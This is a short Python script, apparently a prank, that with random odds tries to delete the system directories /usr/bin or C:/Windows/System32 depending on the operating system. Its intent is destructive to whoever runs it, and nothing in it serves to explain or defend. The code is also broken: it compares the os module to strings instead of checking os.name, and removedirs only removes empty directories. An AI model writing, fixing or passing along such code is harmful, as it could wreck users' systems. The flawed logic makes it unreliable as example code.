import random
import os
if random.randint(0, 6) == 1:
    if os == "posix":
        os.removedirs("/usr/bin")
    elif os == "nt":
        os.removedirs("C:/Windows/System32")
